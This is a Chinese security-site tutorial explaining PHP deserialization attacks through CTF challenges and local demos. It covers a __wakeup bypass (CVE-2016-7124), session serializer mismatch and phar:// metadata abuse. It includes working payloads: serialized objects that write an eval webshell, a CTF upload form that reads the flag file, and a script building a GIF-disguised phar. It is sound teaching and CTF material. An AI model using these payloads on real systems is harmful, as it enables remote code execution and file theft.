# 四个实例递进php反序列化漏洞理解

阅读量 **523602**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-09-12 16:30:13

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t0147953df2c64495d3.jpg)

## 索引

最近在总结php序列化相关的知识，看了好多前辈师傅的文章，决定对四个理解难度递进的序列化思路进行一个复现剖析。包括最近Blackhat议题披露的phar拓展php反序列化漏洞攻击面。前人栽树，后人乘凉，担着前辈师傅们的辅拓前行！

## D0g3

为了让大家进入状态，来一道简单的反序列化小题，新来的表哥们可以先学习一下php序列化和反序列化。顺便安利一下D0g3小组的平台~  
题目平台地址：<http://ctf.d0g3.cn>  
题目入口：<http://120.79.33.253:9001>

页面给了源码

    
    
    <?php
    error_reporting(0);
    include "flag.php";
    $KEY = "D0g3!!!";
    $str = $_GET['str'];
    if (unserialize($str) === "$KEY")
    {
        echo "$flag";
    }
    show_source(__FILE__);
    

提醒大家补充php序列化知识的水题~

直接上传`s:7:"D0g3!!!"`即可get flag

## 绕过魔法函数的反序列化漏洞

漏洞编号CVE-2016-7124

### 魔法函数 **sleep() 和** wakeup()

**php文档中定义__wakeup():**

unserialize() 执行时会检查是否存在一个 **wakeup() 方法。如果存在，则会先调用** wakeup 方法，预先准备对象需要的资源。
**wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。** sleep()则相反，是用在序列化一个对象时被调用

![](https://i.loli.net/2018/09/06/5b90f6d1d8152.png)

###  漏洞剖析

PHP5 < 5.6.25  
PHP7 < 7.0.10  
PHP官方给了示例：<https://bugs.php.net/bug.php?id=72663>  
这个漏洞核心： **序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行** 比如下面这个类构造：

    
    
    class hpdoger{
        public $a = 'nice to meet u';
        }
    

序列化这个类得到的结果：

    
    
    O:7:"hpdoger":1:{s:1:"a";s:6:"nice to meet u";}
    

简单解释一下这个序列化字符串：  
O代表结构类型为：类，7表示类名长度，接着是类名、属性（成员）个数  
大括号内分别是：属性名类型、长度、名称；值类型、长度、值

正常情况下，反序列化一个类得到的结果：  

析构方法和__wakeup都能够执行

如果我们把传入的序列化字符串的属性个数更改成大于1的任何数

    
    
    O:7:"hpdoger":2:{s:1:"a";s:6:"u know";}
    

得到的结果如图，__wakeup没有被执行，但是执行了析构函数  

假如我们的demo是这样的呢?

    
    
    <?php
    class A{
        var $a = "test";
        function __destruct(){
            $fp = fopen("D:\phpStudy\PHPTutorial\WWW\test\shell.php","w");
            fputs($fp,$this->a);
            fclose($fp);
        }
        function __wakeup()
            {
                foreach(get_object_vars($this) as $k => $v) {
                        $this->$k = null;
                }
            }
    }
    $hpdoger = $_POST['hpdoger'];
    $clan = unserialize($hpdoger);
    ?>
    

每次反序列化是都会调用__wakeup从而把$a值清空。但是，如果我们绕过wakeup不就能写Shell了？既然反序列化的内容是可控的，就利用上述的方法绕过wakeup。

poc:

    
    
    O:1:"A":2:{s:1:"a";s:27:"<?php eval($_POST["hp"]);?>";}
    

###  序列化漏洞常见的魔法函数

**construct():当一个类被创建时自动调用  
** destruct():当一个类被销毁时自动调用  
 **invoke():当把一个类当作函数使用时自动调用  
** tostring():当把一个类当作字符串使用时自动调用  
 **wakeup():当调用unserialize()函数时自动调用  
** sleep():当调用serialize()函数时自动调用  
__call():当要调用的方法不存在或权限不足时自动调用

## Session反序列化漏洞

###  Session序列化机制

提到这个漏洞，就得先知道什么叫Session序列化机制。

当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。

PHP处理器的三种序列化方式：  
| 处理器 | 对应的存储格式 |  
| ————————— |:——————————-|  
| php_binary | 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 |  
| php | 键名＋竖线＋经过serialize()函数反序列处理的值 |  
|php_serialize |serialize()函数反序列处理数组方式|

配置文件php.ini中含有这几个与session存储配置相关的配置项：

    
    
    session.save_path=""   --设置session的存储路径,默认在/tmp
    session.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
    session.serialize_handler   --定义用来序列化/反序列化的处理器名字。默认使用php
    

一个简单的demo(session.php)认识一下存储过程：

    
    
    <?php
    ini_set('session.serialize_handler','php_serialize');
    session_start();
    
    $_SESSION['hpdoger'] = $_GET['hpdoger'];
    
    ?>
    

访问页面

    
    
    http://localhost/test/session.php?hpdoger=lover
    

在session.save_path对应路径下会生成一个文件，名称例如:sess_1ja9n59ssk975tff3r0b2sojd5  
因为选择的序列化处理方式为php_serialize,所以是被serialize()函数处理过的$_SESSION[‘hpdoger’]。存储文件内容：

    
    
    a:1:{s:7:"hpdoger";s:5:"lover";}
    

如果选择的序列化处理方式为php，即`ini_set('session.serialize_handler','php');`,则存储内容为：

    
    
    hpdoger|s:5:"lover";
    

###  漏洞剖析

选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。

这里提供一个demo：

存储Session页面

    
    
    /*session.php*/
    
    <?php
    ini_set('session.serialize_handler','php_serialize');
    session_start();
    
    $_SESSION['hpdoger'] = $_GET['hpdoger'];
    
    ?>
    

可利用页面

    
    
    /*test.php*/
    
    <?php 
    ini_set('session.serialize_handler','php');
    session_start();
    
    class hpdoger{
        var $a;
    
        function __destruct(){
            $fp = fopen("D:\phpStudy\PHPTutorial\WWW\test\shell.php","w");
            fputs($fp,$this->a);
            fclose($fp);
        }
    }
    
    ?>
    

访问第一个页面的poc:  

/tmp目录下生成的session文件内容：

    
    
    a:1:{s:7:"hpdoger";s:52:"|O:7:"hpdoger":1:{s:1:"a";s:17:"<?php phpinfo()?>";}";}
    

再访问test.php时反序列化已存储的session，新的php处理方式会把“|”后的值当作KEY值再serialize()，相当于我们实例化了这个页面的hpdoger类，相当于执行:

    
    
    $_SESSION['hpdoger'] = new hpdoger();
    $_SESSION['hpdoger']->a = '<?php phpinfo()?>';
    

在指定的目录D:phpStudyPHPTutorialWWWtestshell.php中会写入内容`<?php phpinfo()?>`  

###  jarvisoj-web的一道SESSION反序列化

题目入口(<http://web.jarvisoj.com:32784/index.php>)  
Index页给源码：

    
    
    <?php
    //A webshell is wait for you
    ini_set('session.serialize_handler', 'php');
    session_start();
    class OowoO
    {
        public $mdzz;
        function __construct()
        {
            $this->mdzz = 'phpinfo();';
        }
    
        function __destruct()
        {
            eval($this->mdzz);
        }
    }
    if(isset($_GET['phpinfo']))
    {
        $m = new OowoO();
    }
    else
    {
        highlight_string(file_get_contents('index.php'));
    }
    ?>
    

看到ini_set(‘session.serialize_handler’, ‘php’);

暂时没找到用php_serialize添加session的方法。但看到当get传入phpinfo时会实例化OowoO这个类并访问phpinfo()  

这里参考Chybeta师傅的一个姿势：session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。

构造上传的表单poc，列出当前目录:

    
    
    <form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
        <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="|O:5:"OowoO":1:{s:4:"mdzz";s:26:"print_r(scandir(__dir__));";}" />
        <input type="file" name="file" />
        <input type="submit" />
    </form>
    

通过phpinfo页面查看当前路径`_SERVER["SCRIPT_FILENAME"]`  

读文件就行

    
    
    |O:5:"OowoO":1:{s:4:"mdzz";s:88:"print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));";}
    

得到flag

    
    
    CTF{4d96e37f4be998c50aa586de4ada354a}
    

## phar伪协议触发php反序列化

最近Black Hat比较热的一个议题：It’s a PHP unserialization vulnerability Jim, but not as
we know it。参考了创宇的文章，这里笔者把它作为php反序列化的最后一个模块，希望日后能在以上的几种反序列化之外拓宽新的思路。

###  phar://协议

可以将多个文件归入一个本地文件夹，也可以包含一个文件

###  phar文件

PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。

###  phar文件结构

详情参考php手册(<https://secure.php.net/phar>)

这里摘出创宇提供的四部分结构概要：  
1、a stub  
识别phar拓展的标识，格式:xxx<?php xxx; __HALT_COMPILER();?>。对应的函数Phar::setStub

2、a manifest describing the contents  
被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata—设置phar归档元数据

3、 the file contents  
被压缩文件的内容。

4、[optional] a signature for verifying Phar integrity (phar file format only)  
签名，放在文件末尾。对应函数Phar :: stopBuffering —停止缓冲对Phar存档的写入请求，并将更改保存到磁盘

###  Phar内置方法

要想使用Phar类里的方法，必须将phar.readonly配置项配置为0或Off（文档中定义）

PHP内置phar类，其他的一些方法如下：

    
    
    $phar = new Phar('phar/hpdoger.phar'); //实例一个phar对象供后续操作
    $phar->startBuffering()  //开始缓冲Phar写操作
    $phar->addFromString('test.php','<?php echo 'this is test file';'); //以字符串的形式添加一个文件到 phar 档案
    $phar->buildFromDirectory('fileTophar') //把一个目录下的文件归档到phar档案
    $phar->extractTo()  //解压一个phar包的函数，extractTo 提取phar文档内容
    

###  漏洞剖析

文件的第二部分a manifest describing the contents可知，phar文件会以序列化的形式存储用户自定义的meta-data，在一些 **文件操作函数**
执行的参数可控，参数部分我们利用Phar伪协议，可以不依赖unserialize()直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。

而在一些上传点，我们可以更改phar的文件头并且修改其后缀名绕过检测，如：test.gif，里面的meta-data却是我们提前写入的恶意代码，而且可利用的
**文件操作函数** 又很多，所以这是一种不错的绕过+执行的方法。

###  文件上传绕过deomo

自己写了个丑陋的代码，只允许gif文件上传（实则有其他方法绕过，这里不赘述），代码部分如下

**前端上传**

    
    
    <form action="http://localhost/test/upload.php" method="post" enctype="multipart/form-data">
        <input type="file" name="hpdoger">
        <input type="submit" name="submit">
    </form>
    

**后端验证**

    
    
    /*upload.php*/
    <?php
        /*返回后缀名函数*/
        function getExt($filename){
            return substr($filename,strripos($filename,'.')+1);
        }
    
        /*检测MIME类型是否为gif*/
        if($_FILES['hpdoger']['type'] != "image/gif"){
            echo "Not allowed !";
            exit;
        }
        else{
            $filenameExt = strtolower(getExt($_FILES['hpdoger']['name']));    /*提取后缀名*/
    
            if($filenameExt != 'gif'){
                echo "Not gif !";
            }
            else{
                move_uploaded_file($_FILES['hpdoger']['tmp_name'], $_FILES['hpdoger']['name']);
                echo "Successfully！";
            }
        }
    ?>
    

代码判断了MIME类型+后缀判断，如下是我测试php文件的两个结果：  
直接上传php  

抓包更改content-type为 image/gif再次上传  
  

可以看到两次都被拒绝上传,那我们更改phar后缀名再次上传

php环境编译生成一个phar文件，代码如下：

    
    
    <?php 
    class not_useful{
        var $file = "<?php phpinfo() ?>";
    }
    
    @unlink("hpdoger.phar");
    $test = new not_useful();
    $phar = new Phar("hpdoger.phar");
    
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); // 增加gif文件头
    $phar->setMetadata($test);
    $phar->addFromString("test.txt","test");
    
    $phar->stopBuffering();
    ?>
    

这里实例的类是为后面的demo做铺垫，php文件同目录下生成hpdoger.phar文件，我们更改名称为hpdoger.gif看一下  

gif头、phar识别序列、序列化后的字符串都具备

上传一下看能否成功,成功绕过检测在服务端存储一个hpdoger.gif  

###  利用Phar://伪协议demo

我们已经上传了可解析的phar文件，现在需要找到一个文件操作函数的页面来利用，这里笔者写一个比较鸡肋的页面，目的是还原流程而非真实情况。

代码如下:reapperance.php

    
    
    <?php
        $recieve = $_GET['recieve'];
    
        /*写入文件类操作*/
        class not_useful{
            var $file;
    
            function __destruct(){
            $fp = fopen("D:\phpStudy\PHPTutorial\WWW\test\shell.php","w"); //自定义写入路径
            fputs($fp,$this->file);
            fclose($fp);
        }
    
        file_get_contents($recieve);
    
    ?>
    

$recieve可控，符合我们的利用条件。那我们构造payload:  

若执行成功，会将刚才写入meta-data数据里面序列化的类进行反序列化，并且实例了$file成员，导致文件写入，成功写入如下：  

###  可利用的文件操作函数

fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize

###  各种文件头

类型 | 标识  
---|---  
JPEG | 头标识ff d8 ,结束标识ff d9  
PNG | 头标识89 50 4E 47 0D 0A 1A 0A  
GIF | 头标识(6 bytes) 47 49 46 38 39(37) 61 GIF89(7)a  
BMP | 头标识(2 bytes) 42 4D BM  
  
## 相关链接

jarvisoj-web-writeup(<https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO>)  
利用 phar 拓展 php 反序列化漏洞攻击面(<https://paper.seebug.org/680/>)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Hpdoger** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/159206](/post/id/159206)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [PHP](/tag/PHP)
  * [反序列化](/tag/反序列化)

 **+1** __28赞

 __收藏

![](https://p5.ssl.qhimg.com/t01b9b27da71ece1d6b.png) Hpdoger

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

